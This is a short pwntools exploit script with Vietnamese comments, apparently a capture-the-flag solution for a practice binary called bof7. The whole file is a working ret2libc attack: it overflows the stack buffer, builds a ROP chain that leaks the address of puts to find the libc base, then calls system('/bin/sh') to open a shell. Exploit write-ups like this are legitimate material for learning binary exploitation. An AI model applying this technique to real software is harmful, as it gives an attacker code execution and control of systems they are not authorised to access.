from pwn import *

exe = ELF("./bof7_patched", checksec=False)
libc = ELF("./libc6-amd64_2.31-0ubuntu9.1_i386.so", checksec=False)
r = process(exe.path)

pop_rdi = 0x0000000000401263


payload = b'a'*88                                   #BOF den thanh ghi rip
payload += p64(pop_rdi) + p64(exe.got['puts'])      #pop rdi, tìm địa chỉ hàm puts
payload += p64(exe.plt['puts'])                     #thực hiện hàm puts
payload += p64(exe.sym['main'])                     #chạy lại hàm main
r.sendafter(b'Say something: \n', payload)


leak_libc = u64(r.recv(6) + b'\0\0')                #nhận leak libc
log.info('leak libc: ' + hex(leak_libc))            #in leak libc
libc.address = leak_libc - libc.sym['puts']         #tìm offset base libc
log.info('leak base: ' + hex(libc.address))

payload = b'a'*88
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])                  #libc.address sẽ cộng với offset system, 
                                                    #nếu không lấy địa chỉ base thì khi in ra dòng nãy sẽ là offset của system
r.sendafter(b'Say something: \n', payload)
r.interactive()
